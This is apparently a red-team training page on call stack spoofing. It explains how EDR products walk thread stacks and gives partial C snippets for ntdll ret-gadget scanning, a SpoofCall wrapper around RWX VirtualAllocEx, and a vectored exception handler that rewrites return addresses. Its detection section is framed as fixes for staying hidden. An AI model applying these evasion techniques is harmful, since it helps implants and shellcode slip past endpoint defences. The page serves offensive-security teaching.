---
layout: training-page
title: "Call Stack Spoofing — Red Team Academy"
module: "Evasion"
tags:
  - stack-spoofing
  - call-stack
  - rop
  - edr-bypass
  - thread-stack
page_key: "evasion-stack-spoofing"
render_with_liquid: false
---

# Call Stack Spoofing

EDR products use stack walking to detect malicious code by examining which functions called a suspicious API. Legitimate processes have clean call stacks (e.g., kernel32 → ntdll → kernel). Shellcode typically shows a short or stub-based stack that originates from unbacked memory. Stack spoofing overwrites the thread stack to present a legitimate-looking call chain, defeating stack-walk-based detections.

## Why Call Stacks Matter

```
// Legitimate stack for Sleep():
// kernel32!Sleep
//   ← kernel32!BaseThreadInitThunk
//     ← ntdll!RtlUserThreadStart

// Malicious stack for Sleep():
// kernel32!Sleep
//   ← 0x0000017F00001234  ← unbacked memory (shellcode)
//     ← 0x0000000000000000

// EDR checks:
// 1. Is return address backed by a PE module?
// 2. Is the call a legitimate call instruction (+5 bytes before ret addr)?
// 3. Does the module have a valid disk-backed image?
// 4. Is the module in the expected call chain for this API?

// Stack spoof goal:
// Replace shellcode addresses in call stack with ntdll/kernel32 addresses
// EDR stack walk sees only legitimate module frames
```

## Thread Stack Spoofing (Ret Addr Replacement)

```
// Approach 1: Overwrite return address before calling Win32 API
// Use a ROP gadget in ntdll as fake return address

// Find a ROP gadget (jmp/call/ret in ntdll):
// Target: address of a "ret" instruction inside ntdll
PVOID ntdll = GetModuleHandleA("ntdll.dll");
// Walk ntdll's .text section for 0xC3 (ret):
PBYTE text = (PBYTE)ntdll + /* .text section RVA */;
PVOID gadget = NULL;
for (int i = 0; i < textSize; i++) {
    if (text[i] == 0xC3) {
        gadget = text + i;
        break;
    }
}

// Overwrite own return address on stack:
// Get RSP, find the return address slot, replace with gadget address
// When API returns → jumps to ret gadget → returns cleanly
```

## Unwinder64 / Spoofy — Structured Stack Spoofing

```
// Spoofy (https://github.com/MadMax1960/Spoofy):
// Builds a synthetic call stack frame chain
// Each frame references a legitimate PE module
// Uses proper UNWIND_INFO so stack walker follows fake chain

// How it works:
// 1. Allocate a fake stack buffer
// 2. Build frames: push return addresses from ntdll, kernel32, etc.
// 3. Set RSP to point to fake stack
// 4. Call target Win32 API
// 5. On return: restore real RSP

// ThreadStackSpoofer (https://github.com/mgeeky/ThreadStackSpoofer):
// Hooks NtWaitForSingleObject to spoof stack during sleep
// Used specifically for sleeping implants

// CallStackSpoofer — wraps any API call with fake stack:
#include "CallStackSpoofer.h"
// Instead of:
VirtualAllocEx(hProc, NULL, 0x1000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
// Use:
SpoofCall(VirtualAllocEx, hProc, NULL, 0x1000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
```

## Hardware Breakpoint Stack Spoofing

```
// Approach: use hardware breakpoints (debug registers) to intercept
// API call mid-execution and modify stack before EDR sees it

// 1. Set hardware breakpoint (DR0) on target API (e.g., NtCreateThreadEx)
// 2. Register VEH (Vectored Exception Handler)
// 3. When API is called → breakpoint fires → VEH runs
// 4. In VEH: walk stack, overwrite malicious return addresses
// 5. Resume execution — EDR's stack capture sees clean stack

// VEH registration:
PVOID hVeh = AddVectoredExceptionHandler(1, ExceptionHandler);

// In exception handler:
LONG ExceptionHandler(EXCEPTION_POINTERS* ep) {
    if (ep->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        // Get RSP from context:
        PCONTEXT ctx = ep->ContextRecord;
        // Walk stack and spoof return addresses
        PULONG_PTR stackPtr = (PULONG_PTR)ctx->Rsp;
        for (int i = 0; i < 8; i++) {
            if (IsUnbackedAddress(stackPtr[i])) {
                stackPtr[i] = (ULONG_PTR)GetNtdllGadget();
            }
        }
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}
```

## Synthetic Frame Construction (RtlCaptureContext)

```
// Full CONTEXT-based spoofing for thread suspension scenarios:
// When EDR calls GetThreadContext/RtlCaptureContext on our thread,
// we want to present a legitimate-looking RIP and call stack.

// Approach:
// 1. Suspend another thread in our process (or use APC)
// 2. GetThreadContext → see clean frame
// 3. Build CONTEXT structure for our thread that shows:
//    RIP = ntdll!NtWaitForSingleObject+0x14
//    RSP = fake stack with clean frames
// 4. SetThreadContext to apply

// Only needed when:
// - Sleeping implant
// - EDR scans suspended threads

// Tools implementing this:
// - Cronos: github.com/Idov31/Cronos
// - Maldev Academy course examples
```

## Detection of Stack Spoofing

```
// Modern EDR detections for stack spoofing:

// 1. UNWIND_INFO mismatch:
//    Fake frames may not have valid unwind information
//    Fix: Use frames from well-known functions with UNWIND_INFO

// 2. Duplicate return addresses:
//    Naive spoofing reuses the same gadget for multiple frames
//    Fix: Use different gadgets from different modules

// 3. Inconsistent RSP alignment:
//    RSP must be 16-byte aligned before CALL
//    Fix: Ensure proper alignment in fake frame construction

// 4. Missing exception handler registrations:
//    Real code registers SEH/VEH — fake stacks may not
//    Fix: Register appropriate handlers

// 5. DLL load order anomalies:
//    Stack showing kernel32 calling a rarely-used ntdll internal
//    Fix: Use realistic call chain sequences
```

## Resources

- ThreadStackSpoofer — `github.com/mgeeky/ThreadStackSpoofer`
- Spoofy — `github.com/MadMax1960/Spoofy`
- Cronos — stack spoof + sleep obfuscation combined
- MDSec — "Hiding Your .NET — ETW" blog (stack analysis)
- Maldev Academy — stack spoofing module
- VX-Underground — Windows internals stack walk papers
